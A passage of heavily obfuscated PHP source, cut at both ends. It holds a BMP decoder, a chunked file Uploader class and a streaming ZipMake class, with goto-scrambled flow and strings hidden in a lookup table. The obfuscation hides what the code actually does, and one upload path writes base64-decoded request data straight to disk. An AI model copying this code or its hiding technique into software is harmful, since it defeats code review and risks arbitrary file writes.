$c·™Î–†, $bÓ›Ãö¹, $Eô†¦ƒ…µ¿[($açœ‡¸®´Î & $CÓ¨¶¶•š‚ >> $bÈ´ôª»Øò) >> $DáÛŒœ¾Ú - $bÈ´ôª»Øò]); } break; } } } else { for ($b¶Ôİ–ˆ¹Ò = 0; $b¶Ôİ–ˆ¹Ò < $E¶½«‰â Æ; ++$b¶Ôİ–ˆ¹Ò, $bÓ›Ãö¹ += $b£­ÅÀ×Ï˜) { $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, $eÈ¾³¿˜Ï); if ($dÙîŠÌ·“‹ === !1) { imagedestroy($fòîšëï÷); return !1; } $cŸ•ŒõÃ×Œ = 0; for ($c·™Î–† = 0; $c·™Î–† < $FÀèÙóã™‡; ++$c·™Î–†, $cŸ•ŒõÃ×Œ += $CÊ„¸çÌØ) { list(, $açœ‡¸®´Î) = unpack($b‡ÒŒºËğ¸[1837], $dÙîŠÌ·“‹[$cŸ•ŒõÃ×Œ >> 3]); $bÈ´ôª»Øò = $cŸ•ŒõÃ×Œ & 7; imagesetpixel($fòîšëï÷, $c·™Î–†, $bÓ›Ãö¹, $Eô†¦ƒ…µ¿[($açœ‡¸®´Î & $CÓ¨¶¶•š‚ >> $bÈ´ôª»Øò) >> $DáÛŒœ¾Ú - $bÈ´ôª»Øò]); } } } goto b–ÂÜ£Ü¨‹; F”½õÁ¶ƒö: $Eô†¦ƒ…µ¿ = array(); for ($e·¼Ô¶“¬× = 0; $e·¼Ô¶“¬× < $F·îø«º²«; ++$e·¼Ô¶“¬×) { $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, $FºæÂäÌ‰“); if ($dÙîŠÌ·“‹ === !1) { imagedestroy($fòîšëï÷); return !1; } extract(unpack($b‡ÒŒºËğ¸[1833], $dÙîŠÌ·“‹ . $b‡ÒŒºËğ¸[1832])); $Eô†¦ƒ…µ¿[] = imagecolorallocate($fòîšëï÷, $DÁÜÃóÁ‚, $cÆÙ×ëœµÛ, $bÈ´ôª»Øò); } $DáÛŒœ¾Ú = 8 - $CÊ„¸çÌØ; goto e­¦ŒÜ; b–ÂÜ£Ü¨‹: } else { goto cä¼Øâ×; F¬µ‰÷¾”…: for ($b¶Ôİ–ˆ¹Ò = 0; $b¶Ôİ–ˆ¹Ò < $E¶½«‰â Æ; ++$b¶Ôİ–ˆ¹Ò, $bÓ›Ãö¹ += $b£­ÅÀ×Ï˜) { $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, $eÈ¾³¿˜Ï); if ($dÙîŠÌ·“‹ === !1) { imagedestroy($fòîšëï÷); return !1; } $cŸ•ŒõÃ×Œ = 0; for ($c·™Î–† = 0; $c·™Î–† < $FÀèÙóã™‡; ++$c·™Î–†, $cŸ•ŒõÃ×Œ += $d•¦’¡ÍªÌ) { list(, $açœ‡¸®´Î) = unpack($b‡ÒŒºËğ¸[1814], substr($dÙîŠÌ·“‹, $cŸ•ŒõÃ×Œ, $d•¦’¡ÍªÌ) . $b‡ÒŒºËğ¸[1838]); $AÕ¥ï©ùÑƒ = $açœ‡¸®´Î & $d‘İ¾­ğá™; $cš“ë½ = $açœ‡¸®´Î & $BÉà•£È¸; $bÒÕŸ¼‹Óî = $açœ‡¸®´Î & $E»…ã¶•½; $FÊŠ‡óƒ…¾ = $açœ‡¸®´Î & $D™©œ“Ç; $Bº»Ô´è´“ = $c™‚ĞÉ…õ - (($AÕ¥ï©ùÑƒ << 7) - $AÕ¥ï©ùÑƒ) * $f––ÉèŞàÄ; $DÁÜÃóÁ‚ = (($cš“ë½ << 8) - $cš“ë½) * $Fè‹ËÆõå; $cÆÙ×ëœµÛ = (($bÒÕŸ¼‹Óî << 8) - $bÒÕŸ¼‹Óî) * $eÊ¥¯‹Ôµ÷; $bÈ´ôª»Øò = (($FÊŠ‡óƒ…¾ << 8) - $FÊŠ‡óƒ…¾) * $fÕë—³¤’Ã; imagesetpixel($fòîšëï÷, $c·™Î–†, $bÓ›Ãö¹, $Bº»Ô´è´“ << 24 | $DÁÜÃóÁ‚ << 16 | $cÆÙ×ëœµÛ << 8 | $bÈ´ôª»Øò); } } imagealphablending($fòîšëï÷, !0); goto a£“©æ§È; f’»Ô×¢ø: $d•¦’¡ÍªÌ = $CÊ„¸çÌØ >> 3; $c™‚ĞÉ…õ = $d‘İ¾­ğá™ ? 127 : 0; $f––ÉèŞàÄ = $d‘İ¾­ğá™ ? 1 / $d‘İ¾­ğá™ : 1; goto F×‚Ê¯”ØŸ; cä¼Øâ×: $fòîšëï÷ = imagecreatetruecolor($FÀèÙóã™‡, $E¶½«‰â Æ); imagealphablending($fòîšëï÷, !1); if ($d‘İ¾­ğá™) { imagesavealpha($fòîšëï÷, !0); } goto f’»Ô×¢ø; F×‚Ê¯”ØŸ: $Fè‹ËÆõå = $BÉà•£È¸ ? 1 / $BÉà•£È¸ : 1; $eÊ¥¯‹Ôµ÷ = $E»…ã¶•½ ? 1 / $E»…ã¶•½ : 1; $fÕë—³¤’Ã = $D™©œ“Ç ? 1 / $D™©œ“Ç : 1; goto F¬µ‰÷¾”…; a£“©æ§È: } return $fòîšëï÷; goto EÄ®èğßÃ‹; F³Œİå¡¾: if ($dÙîŠÌ·“‹ === !1) { return !1; } list(, $b¨¡·Îàã) = unpack($b‡ÒŒºËğ¸[1814], $dÙîŠÌ·“‹); if ($b¨¡·Îàã == 12) { goto f£ªáœ‡¹µ; EÄ…Ùâ®¶Œ: $eÀØÕÉŞŒ = $F·ğ¢×…  = $d‘İ¾­ğá™ = $b»‡‘ó·˜ = 0; $BÉà•£È¸ = 16711680; $E»…ã¶•½ = 65280; goto dœ‹¯×è¬á; dœ‹¯×è¬á: $D™©œ“Ç = 255; goto cç§¨¾•ªÙ; f£ªáœ‡¹µ: $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, $b¨¡·Îàã - 4); if ($dÙîŠÌ·“‹ === !1) { return !1; } extract(unpack($b‡ÒŒºËğ¸[1815] . $b‡ÒŒºËğ¸[1816] . $b‡ÒŒºËğ¸[1817] . $b‡ÒŒºËğ¸[1818], $dÙîŠÌ·“‹)); goto EÄ…Ùâ®¶Œ; cç§¨¾•ªÙ: } else { if (124 < $b¨¡·Îàã || $b¨¡·Îàã < 40) { return !1; } else { goto Aâä˜­Ò÷; Aâä˜­Ò÷: $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, 36); if ($dÙîŠÌ·“‹ === !1) { return !1; } extract(unpack($b‡ÒŒºËğ¸[1819] . $b‡ÒŒºËğ¸[1820] . $b‡ÒŒºËğ¸[1817] . $b‡ÒŒºËğ¸[1821] . $b‡ÒŒºËğ¸[1822] . $b‡ÒŒºËğ¸[1823] . $b‡ÒŒºËğ¸[1824] . $b‡ÒŒºËğ¸[1825] . $b‡ÒŒºËğ¸[1826] . $b‡ÒŒºËğ¸[1827], $dÙîŠÌ·“‹)); goto bÕİäà˜†÷; bÕİäà˜†÷: if ($FÀèÙóã™‡ & 2147483648) { $FÀèÙóã™‡ = -(~$FÀèÙóã™‡ & 4294967295) - 1; } if ($B¤ÓÂåŠ¯Ú & 2147483648) { $B¤ÓÂåŠ¯Ú = -(~$B¤ÓÂåŠ¯Ú & 4294967295) - 1; } if ($d˜”Äˆ¯äÄ & 2147483648) { $d˜”Äˆ¯äÄ = -(~$d˜”Äˆ¯äÄ & 4294967295) - 1; } goto Eİ‡‚–Û§; Eİ‡‚–Û§: if ($DÚ«¨®– Ù & 2147483648) { $DÚ«¨®– Ù = -(~$DÚ«¨®– Ù & 4294967295) - 1; } if ($D˜÷Óáù—[$b‡ÒŒºËğ¸[516]] != 0) { $a–ôÊ Åõ = $CÊ„¸çÌØ == 1 || $CÊ„¸çÌØ == 4 || $CÊ„¸çÌØ == 8 ? ($eÀØÕÉŞŒ ? $eÀØÕÉŞŒ : pow(2, $CÊ„¸çÌØ)) << 2 : 0; $AŞŒöÜŒù‹ = $Bğ¹ÅË…õ¸ ? $Bğ¹ÅË…õ¸ : ($FÀèÙóã™‡ * $CÊ„¸çÌØ + 31 >> 3 & ~3) * abs($B¤ÓÂåŠ¯Ú); $FÁÁÆ¶ÂŸ = $D˜÷Óáù—[$b‡ÒŒºËğ¸[516]] - $AŞŒöÜŒù‹ - $a–ôÊ Åõ - 14; if ($b¨¡·Îàã < $FÁÁÆ¶ÂŸ && 40 <= $b¨¡·Îàã && $b¨¡·Îàã <= 124) { $b¨¡·Îàã = $FÁÁÆ¶ÂŸ; } } if ($b¨¡·Îàã - 40 > 0) { $dÙîŠÌ·“‹ = fread($d¬ÆŒÏµŠ‹, $b¨¡·Îàã - 40); if ($dÙîŠÌ·“‹ === !1) { return !1; } extract(unpack($b‡ÒŒºËğ¸[1828] . $b‡ÒŒºËğ¸[1829] . $b‡ÒŒºËğ¸[1830] . $b‡ÒŒºËğ¸[1831], $dÙîŠÌ·“‹ . str_repeat($b‡ÒŒºËğ¸[1832], 120))); } else { $d‘İ¾­ğá™ = $BÉà•£È¸ = $E»…ã¶•½ = $D™©œ“Ç = 0; } goto EÀ¡›ğ÷µÒ; EÀ¡›ğ÷µÒ: if (($CÊ„¸çÌØ == 16 || $CÊ„¸çÌØ == 24 || $CÊ„¸çÌØ == 32) && $b»‡‘ó·˜ == 0 && $BÉà•£È¸ == 0 && $E»…ã¶•½ == 0 && $D™©œ“Ç == 0) { switch ($CÊ„¸çÌØ) { case 16: $BÉà•£È¸ = 31744; $E»…ã¶•½ = 992; $D™©œ“Ç = 31; break; case 24: case 32: $BÉà•£È¸ = 16711680; $E»…ã¶•½ = 65280; $D™©œ“Ç = 255; break; } } goto f«¬¹›´Ô†; f«¬¹›´Ô†: } } goto EïáğÎ…Çñ; EÄ®èğßÃ‹: } } goto f”Ğ•øÕ‰¸; F‘òãˆ¯: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto eŠ¢Ô–Çè¾; c¤¯¾Ü™†ù: $this->checkSize(); $this->tempPathInit(); goto FğîŒÕ¦ƒ¬; A×½‹ÌÉß‡: if (!empty($_FILES)) { $CõªÒÇ™ì = $_FILES[$Dš¤ñæ¶£ì[164]]; $this->uploadFile = $CõªÒÇ™ì[$Dš¤ñæ¶£ì[1942]]; if (!$this->uploadFile && $CõªÒÇ™ì[$Dš¤ñæ¶£ì[1213]] > 0) { show_json($this->errorInfo($CõªÒÇ™ì[$Dš¤ñæ¶£ì[1213]]), !1); } } else { if (isset($in[$Dš¤ñæ¶£ì[383]])) { $this->uploadFile = isset($in[$Dš¤ñæ¶£ì[1943]]) ? $Dš¤ñæ¶£ì[1944] : $Dš¤ñæ¶£ì[1789]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto c¤¯¾Ü™†ù; eŠ¢Ô–Çè¾: $Dš¤ñæ¶£ì =& $_SERVER[Äº¡•ô™Ÿ]; global $in; $this->in =& $in; goto A×½‹ÌÉß‡; FğîŒÕ¦ƒ¬: } public function upload() { goto a½¿À²ñÆ; FÁ•‘¥Å®ã: @unlink($b“É£Âšº); if (!$BÈÖ‹–§Ç) { $this->showJson($A‚÷éÚŸ™[1953] . $A­†¯¤Šâ›, !1); } $FØÚ•ÁË¶ë[$A‚÷éÚŸ™[1954]] = $f§Æğ¸Èêí; goto cĞ½‘¢™Èá; a½¿À²ñÆ: $A‚÷éÚŸ™ =& $_SERVER[Äº¡•ô™Ÿ]; $A­†¯¤Šâ› = isset($this->in[$A‚÷éÚŸ™[1945]]) ? intval($this->in[$A‚÷éÚŸ™[1945]]) : 0; $f§Æğ¸Èêí = isset($this->in[$A‚÷éÚŸ™[1946]]) ? intval($this->in[$A‚÷éÚŸ™[1946]]) : 1; goto dÉƒêœŠß˜; aÆñŒ× à©: $dÍƒê”Õ¬ò = $A­†¯¤Šâ› * $A§óã ™í›; $D…¡¤†ã… = @fopen($this->tempFile, $A‚÷éÚŸ™[1952]); fseek($D…¡¤†ã…, $dÍƒê”Õ¬ò); goto FôÈ°«Şå®; FôÈ°«Şå®: $BÈÖ‹–§Ç = $this->writeTo($b“É£Âšº, $D…¡¤†ã…, $this->tempFile); $E˜†ö÷Ï´¤ = IO::hashSimple($b“É£Âšº); $DÇŒ—‰Û÷‹ = IO::size($b“É£Âšº); goto FÁ•‘¥Å®ã; DƒÉø‚Ó—ä: if ($f§Æğ¸Èêí > 1 && $A§óã ™í› <= 0) { show_json($A‚÷éÚŸ™[1949], !1); } if ($A§óã ™í› > $DÇŒ—‰Û÷‹) { $f§Æğ¸Èêí = 1; } if ($f§Æğ¸Èêí <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto E…¹Ÿ”¤ìÚ; bØˆØ”µÔÉ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto cƒÂÚ—ğ•; dÉƒêœŠß˜: $cÌæÄĞœ®å = $this->tempFile . $A‚÷éÚŸ™[1947] . $A­†¯¤Šâ›; $DÇŒ—‰Û÷‹ = isset($this->in[$A‚÷éÚŸ™[516]]) ? intval($this->in[$A‚÷éÚŸ™[516]]) : 0; $A§óã ™í› = isset($this->in[$A‚÷éÚŸ™[1948]]) ? intval($this->in[$A‚÷éÚŸ™[1948]]) : 0; goto DƒÉø‚Ó—ä; F´Åá”ğèê: $b“É£Âšº = $this->moveUploadedFile($cÌæÄĞœ®å); if ($DÇŒ—‰Û÷‹ > 0 && filesize($b“É£Âšº) == 0) { $this->showJson($A‚÷éÚŸ™[1950], !1); } if (!$b“É£Âšº) { $this->showJson(LNG($A‚÷éÚŸ™[1951]), !1); } goto aÆñŒ× à©; E…¹Ÿ”¤ìÚ: CacheLock::lock($this->tempFile, 20); $FØÚ•ÁË¶ë = $this->statusGet(); $this->initFileTemp(); goto F´Åá”ğèê; cĞ½‘¢™Èá: $FØÚ•ÁË¶ë[$A‚÷éÚŸ™[1955]][$A‚÷éÚŸ™[1956] . $A­†¯¤Šâ›] = array($A‚÷éÚŸ™[1957] => $dÍƒê”Õ¬ò, $A‚÷éÚŸ™[1036] => $A­†¯¤Šâ›, $A‚÷éÚŸ™[77] => $DÇŒ—‰Û÷‹, $A‚÷éÚŸ™[161] => $E˜†ö÷Ï´¤); $this->statusSet($FØÚ•ÁË¶ë); if (count($FØÚ•ÁË¶ë[$A‚÷éÚŸ™[1955]]) != $FØÚ•ÁË¶ë[$A‚÷éÚŸ™[1954]]) { $this->showJson($A‚÷éÚŸ™[1958] . $A­†¯¤Šâ›, !0); } goto fŠ«ÚƒõÉ; fŠ«ÚƒõÉ: ignore_timeout(); if (!$this->checkChunkHash($FØÚ•ÁË¶ë)) { $this->showJson($A‚÷éÚŸ™[1959], !1); } $this->statusSet(!1); goto bØˆØ”µÔÉ; cƒÂÚ—ğ•: } private function checkSize() { $CÎ×Ó‚³ğ“ =& $_SERVER[Äº¡•ô™Ÿ]; if (phpBuild64() || $this->in[$CÎ×Ó‚³ğ“[77]] < PHP_INT_MAX) { return; } show_json(LNG($CÎ×Ó‚³ğ“[1960]), !1); } private function showJson($Aá‡¼ƒ‘, $AÒ “Ä¤Ğ±) { CacheLock::unlock($this->tempFile); if (!$AÒ “Ä¤Ğ±) { return show_json($Aá‡¼ƒ‘, $AÒ “Ä¤Ğ±); } show_json($Aá‡¼ƒ‘, $AÒ “Ä¤Ğ±); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto Dùöï¥ÄŸÏ; EÄ“Ğ°¨å: touch($bÁ…¥’†Ÿ‘ . $eÈó°²…ŞÛ[1961]); $b¯„Æ®çĞÑ = isset($this->in[$eÈó°²…ŞÛ[1962]]) ? $this->in[$eÈó°²…ŞÛ[1962]] : !1; if (strlen($b¯„Æ®çĞÑ) < 30) { $b¯„Æ®çĞÑ = md5(USER_ID . $this->in[$eÈó°²…ŞÛ[75]] . $this->fileName . $this->in[$eÈó°²…ŞÛ[77]]); } goto a©ÄÓ™ Í; Dùöï¥ÄŸÏ: $eÈó°²…ŞÛ =& $_SERVER[Äº¡•ô™Ÿ]; $bÁ…¥’†Ÿ‘ = TEMP_FILES; @mk_dir($bÁ…¥’†Ÿ‘); goto EÄ“Ğ°¨å; a©ÄÓ™ Í: $this->tempFile = $bÁ…¥’†Ÿ‘ . $eÈó°²…ŞÛ[1963] . md5($b¯„Æ®çĞÑ . $this->in[$eÈó°²…ŞÛ[1507]]); goto dˆ‹ã‹ŸõŒ; dˆ‹ã‹ŸõŒ: } private function moveUploadedFile($EËÙÂ‡Ò…Í) { $fíÅœÁÅ— =& $_SERVER[Äº¡•ô™Ÿ]; $E™İ¡Ô”Œ = $this->uploadFile; if ($E™İ¡Ô”Œ == $fíÅœÁÅ—[1964]) { @file_put_contents($EËÙÂ‡Ò…Í, base64_decode($_REQUEST[$fíÅœÁÅ—[1965]])); } else { if ($E™İ¡Ô”Œ == $fíÅœÁÅ—[1789]) { $AÍéØ¾”­¿ = @fopen($EËÙÂ‡Ò…Í, $fíÅœÁÅ—[1496]); $this->writeTo($E™İ¡Ô”Œ, $AÍéØ¾”­¿, $EËÙÂ‡Ò…Í); } else { if (!move_uploaded_file($E™İ¡Ô”Œ, $EËÙÂ‡Ò…Í)) { return !1; } } } return $EËÙÂ‡Ò…Í; } private function writeTo($D–ğÈ‘£ì, $e‚¤šÆ‹ùº, $CÅ¸ŠçÆ£Ì) { goto F†İİ‰‘…™; B…†¾Ä‚Ù : return !0; goto C‰ƒ©½áŠ²; F†İİ‰‘…™: $cõÁ‚‡©Î« =& $_SERVER[Äº¡•ô™Ÿ]; $dëï”óæ = $cõÁ‚‡©Î«[1966] . $CÅ¸ŠçÆ£Ì; $D²·Ù»·Æƒ = CacheLock::lock($dëï”óæ, 1); goto B¼ã‹ºÀƒŸ; C¦á¿ˆ£”Î: fclose($FÊ´çµëÇŸ); fclose($e‚¤šÆ‹ùº); CacheLock::unlock($dëï”óæ); goto B…†¾Ä‚Ù ; B¼ã‹ºÀƒŸ: $FÊ´çµëÇŸ = @fopen($D–ğÈ‘£ì, $cõÁ‚‡©Î«[1495]); if (!$FÊ´çµëÇŸ || !$e‚¤šÆ‹ùº || !$D²·Ù»·Æƒ) { CacheLock::unlock($dëï”óæ); return !1; } while (!feof($FÊ´çµëÇŸ)) { fwrite($e‚¤šÆ‹ùº, fread($FÊ´çµëÇŸ, 1024 * 200)); } goto C¦á¿ˆ£”Î; C‰ƒ©½áŠ²: } private function statusGet() { goto fÌ×³ôíë©; eÄœáƒ¾‘ê: if (!$this->statusData) { $F¥Ğî†„Å¤ = array($EÛÔÓ¾®­¨[28] => $this->fileName, $EÛÔÓ¾®­¨[1954] => 0, $EÛÔÓ¾®­¨[1955] => array()); $this->statusSet($F¥Ğî†„Å¤); } return $this->statusData; goto f”´ñ¾Ó…›; CÌí°‰Ü‘: $D¸‰¼¬è‘ = !1; if (file_exists($BÚ‚·¾…ˆë)) { $D¸‰¼¬è‘ = @file_get_contents($BÚ‚·¾…ˆë); } if ($D¸‰¼¬è‘) { $this->statusData = unserialize($D¸‰¼¬è‘); } goto eÄœáƒ¾‘ê; fÌ×³ôíë©: $EÛÔÓ¾®­¨ =& $_SERVER[Äº¡•ô™Ÿ]; if (is_array($this->statusData)) { return $this->statusData; } $BÚ‚·¾…ˆë = $this->tempFile . $EÛÔÓ¾®­¨[1967]; goto CÌí°‰Ü‘; f”´ñ¾Ó…›: } public function statusSet($Aš™•…ÁÎ…) { $dó·õˆ = $this->tempFile . $_SERVER[Äº¡•ô™Ÿ][1967]; if (!$Aš™•…ÁÎ…) { if (file_exists($dó·õˆ)) { @unlink($dó·õˆ); } return !0; } $this->statusData = $Aš™•…ÁÎ…; return file_put_contents($dó·õˆ, serialize($Aš™•…ÁÎ…)); } private function initFileTemp() { $dªÕ»ä‚ß =& $_SERVER[Äº¡•ô™Ÿ]; if (file_exists($this->tempFile)) { return; } $F›²·à¹  = fopen($this->tempFile, $dªÕ»ä‚ß[1968]); fseek($F›²·à¹ , $this->in[$dªÕ»ä‚ß[77]] - 1, SEEK_SET); fwrite($F›²·à¹ , $dªÕ»ä‚ß[464]); fclose($F›²·à¹ ); } public function checkChunk() { goto e—‰Ÿ‘¾øø; e—‰Ÿ‘¾øø: $bÃìŞ¿ƒÔ¢ =& $_SERVER[Äº¡•ô™Ÿ]; $fÀòÁ³áŸÒ = array(); CacheLock::lock($this->tempFile); goto cİôÊçñó; B´ëê¶Œêí: return $fÀòÁ³áŸÒ; goto CÌ…¢¿îƒ‹; cİôÊçñó: $AÆÇÑ˜êäº = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($AÆÇÑ˜êäº[$bÃìŞ¿ƒÔ¢[1955]] as $Eù§é¬ÅÇì) { $A¥“ÒİáØÚ = $Eù§é¬ÅÇì[$bÃìŞ¿ƒÔ¢[161]]; if ($A¥“ÒİáØÚ) { $fÀòÁ³áŸÒ[$bÃìŞ¿ƒÔ¢[1969] . $Eù§é¬ÅÇì[$bÃìŞ¿ƒÔ¢[1036]]] = $A¥“ÒİáØÚ; } } goto B´ëê¶Œêí; CÌ…¢¿îƒ‹: } private function checkChunkHash($e»ó’™È°ä) { goto D¨÷éá™™–; dÈÈù¤¡…: $eåÀÈÚÍª = _get($this->in, $D³Îõîäæ[1970]); if (strlen($eåÀÈÚÍª) == 32 && IO::hashSimple($this->tempFile) == $D×÷ÑÇƒô && IO::hashMd5($this->tempFile) == $eåÀÈÚÍª) { return !0; } $aÍÙ…Øë‹¦ = fopen($this->tempFile, $D³Îõîäæ[1162]); goto Aò“­éé‡²; d×´ö©œ¡: return $BøÏ­¥ËÄ™; goto B¦¹ó±×Ô; D¨÷éá™™–: $D³Îõîäæ =& $_SERVER[Äº¡•ô™Ÿ]; if (count($e»ó’™È°ä[$D³Îõîäæ[1955]]) != $e»ó’™È°ä[$D³Îõîäæ[1954]]) { return !1; } $D×÷ÑÇƒô = _get($this->in, $D³Îõîäæ[1962]); goto dÈÈù¤¡…; Aò“­éé‡²: $BøÏ­¥ËÄ™ = !0; foreach ($e»ó’™È°ä[$D³Îõîäæ[1955]] as $Cİ‡ÍÉÀÆ) { fseek($aÍÙ…Øë‹¦, $Cİ‡ÍÉÀÆ[$D³Îõîäæ[1957]]); $b¿î—È = PathDriverStream::hash($aÍÙ…Øë‹¦, $Cİ‡ÍÉÀÆ[$D³Îõîäæ[77]]); if ($Cİ‡ÍÉÀÆ[$D³Îõîäæ[161]] != $b¿î—È) { $BøÏ­¥ËÄ™ = !1; break; } } fclose($aÍÙ…Øë‹¦); goto d×´ö©œ¡; B¦¹ó±×Ô: } public static function fileName() { goto BŠ„¦¿Ñµã; e»ÌãåÖ­: if (!empty($_FILES)) { $eöµÊÇË‡ = $eöµÊÇË‡ ? $eöµÊÇË‡ : $_FILES[$dåöàÕÖ[164]][$dåöàÕÖ[383]]; } $eöµÊÇË‡ = str_replace(array($dåöàÕÖ[95], $dåöàÕÖ[8]), array($dåöàÕÖ[8], $dåöàÕÖ[93]), trim($eöµÊÇË‡)); if (!is_wap()) { return $eöµÊÇË‡; } goto BçŒ›å‰Í¸; BŠ„¦¿Ñµã: $dåöàÕÖ =& $_SERVER[Äº¡•ô™Ÿ]; global $in; $eöµÊÇË‡ = isset($in[$dåöàÕÖ[28]]) ? $in[$dåöàÕÖ[28]] : $dåöàÕÖ[33]; goto e»ÌãåÖ­; A©Ÿô“íÕõ: if ($dóøÆŠ¶Ì› == $dåöàÕÖ[1972] || $dóøÆŠ¶Ì› == $dåöàÕÖ[1973]) { $eöµÊÇË‡ = date($dåöàÕÖ[693], $a¢ˆÜã½ï„) . $dåöàÕÖ[70] . $in[$dåöàÕÖ[77]] . $dåöàÕÖ[1604]; } else { if ($dóøÆŠ¶Ì› == $dåöàÕÖ[1974]) { $eöµÊÇË‡ = date($dåöàÕÖ[693], $a¢ˆÜã½ï„) . $dåöàÕÖ[70] . $in[$dåöàÕÖ[77]] . $dåöàÕÖ[1975]; } } return $eöµÊÇË‡; goto fˆé•¨©‚Á; BçŒ›å‰Í¸: $a¢ˆÜã½ï„ = strtotime($in[$dåöàÕÖ[1971]]); $a¢ˆÜã½ï„ = $a¢ˆÜã½ï„ ? $a¢ˆÜã½ï„ : time(); $dóøÆŠ¶Ì› = strtolower($eöµÊÇË‡); goto A©Ÿô“íÕõ; fˆé•¨©‚Á: } private function errorInfo($F¨®ô·Í¬») { $Cé¬‹ø =& $_SERVER[Äº¡•ô™Ÿ]; $FéµŒ™á­ä = array($Cé¬‹ø[1976], $Cé¬‹ø[1977], $Cé¬‹ø[1978], $Cé¬‹ø[1979], $Cé¬‹ø[1980], $Cé¬‹ø[1981], $Cé¬‹ø[1982], $Cé¬‹ø[1983]); return $F¨®ô·Í¬» . $Cé¬‹ø[4] . $FéµŒ™á­ä[$F¨®ô·Í¬»]; } } class ZipMake { const VERSION = "\60\56\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($eöê®†éâ = null) { $Bö¦ÔôÅ«‡ =& $_SERVER[Äº¡•ô™Ÿ]; $this->outputStream = fopen($Bö¦ÔôÅ«‡[1984], $Bö¦ÔôÅ«‡[1220]); $this->outputName = $eöê®†éâ; $this->needHeaders = !0; } public function addFile($eğğ´¾Ïƒæ, $fÃà»Ğ´’Í) { goto aù‡ˆ×Æøœ; C‡Şå´­Æ£: while (!feof($dğİïÚÇï)) { $f²ÅîŸ„¼Ã = fread($dğİïÚÇï, 1048576); $this->send($f²ÅîŸ„¼Ã); } fclose($dğİïÚÇï); $cíî…¬¨Ë = hexdec(hash_file($A¸……¡’âæ[1986], $fÃà»Ğ´’Í)); goto E‚µ´µ‹Ñ¶; BáÂõÑ¹»¢: $A‡õç¦æˆÈ = $this->addFileHeader($eğğ´¾Ïƒæ, $CäË¬®ëê); $F¿ÆğŸÅÍ = $F¤¯îÒŠâš = filesize($fÃà»Ğ´’Í); $dğİïÚÇï = fopen($fÃà»Ğ´’Í, $A¸……¡’âæ[1985]); goto C‡Şå´­Æ£; aù‡ˆ×Æøœ: $A¸……¡’âæ =& $_SERVER[Äº¡•ô™Ÿ]; $eğğ´¾Ïƒæ = $this->filterFilename($eğğ´¾Ïƒæ); $CäË¬®ëê = static::METHOD_STORE; goto BáÂõÑ¹»¢; E‚µ´µ‹Ñ¶: $this->addFileFooter($eğğ´¾Ïƒæ, $CäË¬®ëê, $cíî…¬¨Ë, $F¿ÆğŸÅÍ, $F¤¯îÒŠâš, $A‡õç¦æˆÈ); goto A±Øó™å‰Ö; A±Øó™å‰Ö: } public function addFileFromStream($C£õ²æ¡Ü¬, $D¡Ò§«Æ‡®) { goto e±µŞŠ»î; Aàš§‹éÖ“: $this->addFileFooter($C£õ²æ¡Ü¬, $cÑñ†Áß–¢, $b¸‚Â‚ñÙ, $A—‡ˆÃ…Ñ, $B³œô’è, $BÀöÜÇõÄÛ); goto cµØãšÚãö; e±µŞŠ»î: $C£õ²æ¡Ü¬ = $this->filterFilename($C£õ²æ¡Ü¬); $cÑñ†Áß–¢ = static::METHOD_STORE; $BÀöÜÇõÄÛ = $this->addFileHeader($C£õ²æ¡Ü¬, $cÑñ†Áß–¢); goto aäø×â‹¹É; aäø×â‹¹É: fseek($D¡Ò§«Æ‡®, 0, SEEK_END); $A—‡ˆÃ…Ñ = $B³œô’è = ftell($D¡Ò§«Æ‡®); rewind($D¡Ò§«Æ‡®); goto CôÓîñª™ö; CôÓîñª™ö: $BëáÕ¤ÀÕ = hash_init($_SERVER[Äº¡•ô™Ÿ][1986]); while (!feof($D¡Ò§«Æ‡®)) { $D½­ËÏºíá = fread($D¡Ò§«Æ‡®, 1048576); hash_update($BëáÕ¤ÀÕ, $D½­ËÏºíá); $this->send($D½­ËÏºíá); } $b¸‚Â‚ñÙ = hexdec(hash_final($BëáÕ¤ÀÕ)); goto Aàš§‹éÖ“; cµØãšÚãö: } public function finish() { foreach ($this->files as $aÇôº³½”Á) { $this->addCdrFile($aÇôº³½”Á); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($b¨²×Óò, $FÁ“§µñÜ¬) { goto E­·”ğßÉ; E­·”ğßÉ: $B‡Ùš«¿àî =& $_SERVER[Äº¡•ô™Ÿ]; $b¨²×Óò = preg_replace($B‡Ùš«¿àî[1987], $B‡Ùš«¿àî[33], $b¨²×Óò); $dèãŞ‡ùÃ¿ = strlen($b¨²×Óò); goto D—Ò‚¼µ„¢; fÍŠ²Šî¾¢: $F—”õ±¶åÑ = $this->packFields($c´Ö•ê†Îò); $A…‚±§¾Š¢ = $this->packFields($C¬››¡í÷); $this->send($F—”õ±¶åÑ . $b¨²×Óò . $A…‚±§¾Š¢); goto bïö‚ÁêéÍ; D—Ò‚¼µ„¢: $a½˜âöÁ¥ = $this->dosTime(time()); $c´Ö•ê†Îò = array(array($B‡Ùš«¿àî[1988], static::FILE_HEADER_SIGNATURE), array($B‡Ùš«¿àî[1989], static::ZIP_VERSION_64), array($B‡Ùš«¿àî[1989], 8), array($B‡Ùš«¿àî[1989], $FÁ“§µñÜ¬), array($B‡Ùš«¿àî[1988], $a½˜âöÁ¥), array($B‡Ùš«¿àî[1988], 0), array($B‡Ùš«¿àî[1988], 4294967295), 